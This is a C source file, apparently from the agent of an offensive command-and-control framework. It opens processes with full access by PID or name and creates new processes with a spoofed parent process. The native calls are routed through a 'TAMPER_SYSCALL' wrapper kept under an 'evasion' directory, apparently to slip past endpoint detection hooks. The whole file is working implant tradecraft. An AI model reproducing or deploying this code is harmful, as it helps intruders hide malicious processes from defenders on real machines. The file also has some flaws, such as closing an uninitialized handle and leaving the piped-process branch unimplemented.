//
// Created by Brendan Ortiz on 8/12/2024.
//
#include "../../headers/helpers/win32.h"
#include "../../headers/agent/evasion/Common.h"
#include "../../headers/cstdreplacement/localcstd.h"
#include <stdio.h>

HANDLE GetProcessHandleFromPID(DWORD dwPID) {

            CLIENT_ID threadClientID = {0};
            //threadClientID.UniqueThread = (HANDLE)te32.th32ThreadID;
            threadClientID.UniqueProcess = (HANDLE)dwPID;
            OBJECT_ATTRIBUTES objAttr = {0};
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

            HANDLE hProcess = NULL;
            NTSTATUS status = TAMPER_SYSCALL(agent->apis->pNtOpenProcess, 4, &hProcess, PROCESS_ALL_ACCESS, &objAttr, &threadClientID);
            if(NT_SUCCESS(status)) {
            	return hProcess;
            }

	return INVALID_HANDLE_VALUE;
}

HANDLE GetProcessHandleFromStr(LPCSTR ProcessName) {
	HANDLE hProcess = NULL;
	HANDLE hThreadSnap = NULL;
	PROCESSENTRY32 pe32 = {0};
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnap == INVALID_HANDLE_VALUE) {
		return INVALID_HANDLE_VALUE;
	}

	if(!Process32First(hSnap, &pe32)) {
		CloseHandle(hSnap);
		return INVALID_HANDLE_VALUE;
	}

	do {

		if(StrCmpA(ProcessName, pe32.szExeFile) == 0) {

					CLIENT_ID threadClientID = {0};
					threadClientID.UniqueProcess = (HANDLE)pe32.th32ProcessID;
					OBJECT_ATTRIBUTES objAttr = {0};
					InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

					HANDLE hThread = NULL;
					NTSTATUS status = agent->apis->pNtOpenProcess(&hThread, PROCESS_ALL_ACCESS, &objAttr, &threadClientID);
					if(NT_SUCCESS(status)) {
						CloseHandle(hThreadSnap);
						return hThread;
					}




			break;
		}

	} while(Process32Next(hSnap, &pe32));


	_EndOfFunc:
	if(hSnap != NULL)
		CloseHandle(hSnap);

	return hProcess;
}

BOOL ProcessCreate(IN PWSTR TargetProcess, IN PWSTR ProcessParameters, IN PWSTR ProcessPath, IN HANDLE hParentProcess, IN BOOL PIPED, OUT PHANDLE hProcess, OUT PHANDLE hThread) {
	NTSTATUS				NtStatus					= 0;
	_INT_UNICODE_STRING		uNtImagePath				= {0},
							uCommandLine				= {0},
							uCurrentDirectory			= {0};

	P_INT_RTL_USER_PROCESS_PARAMETERS		 pProcessParams			= NULL;
	PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(PS_ATTRIBUTE_LIST));
	if(!pAttributeList) {
		printf("[error] failed to allocate memory for attribute list\n");
		return FALSE;
	}

	_RtlInitUnicodeString(&uNtImagePath, TargetProcess);
	_RtlInitUnicodeString(&uCommandLine, ProcessParameters);
	_RtlInitUnicodeString(&uCurrentDirectory, ProcessPath);

	NtStatus = agent->apis->pRtlCreateProcessParametersEx(&pProcessParams, &uNtImagePath, NULL, &uCurrentDirectory, &uCommandLine,
		NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if(NtStatus != STATUS_SUCCESS) {
		printf("[error] failed to create process parameters %lx\n", NtStatus);
		goto _EndOfFunc;
	}

	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = uNtImagePath.Length;
	pAttributeList->Attributes[0].Value = uNtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[1].Size = sizeof(HANDLE);
	pAttributeList->Attributes[1].Value = hParentProcess;

	PS_CREATE_INFO CreateInfo = {
		.Size = sizeof(PS_CREATE_INFO),
		.State = PsCreateInitialState,
	};

	if(PIPED) {
		//DO CREATE NAMED PIPES HERE.
		pProcessParams->StandardInput = NULL;
		pProcessParams->StandardOutput = NULL;
		pProcessParams->StandardError = NULL;
	} else {

		NtStatus = TAMPER_SYSCALL(agent->apis->pNtCreateUserProcess, 11, (ULONG_PTR)hProcess, (ULONG_PTR)hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
			NULL, NULL, NULL, NULL, (ULONG_PTR)pProcessParams, (ULONG_PTR)&CreateInfo, (ULONG_PTR)pAttributeList);
		if(NtStatus != STATUS_SUCCESS)
			printf("[error] attempting to create process %lx\n", NtStatus);
	}


	_EndOfFunc:
	if(pAttributeList) {
		agent->apis->pLocalFree(pAttributeList);
		pAttributeList = NULL;
	}
	return *hProcess == NULL || *hThread == NULL ?  FALSE : TRUE;

}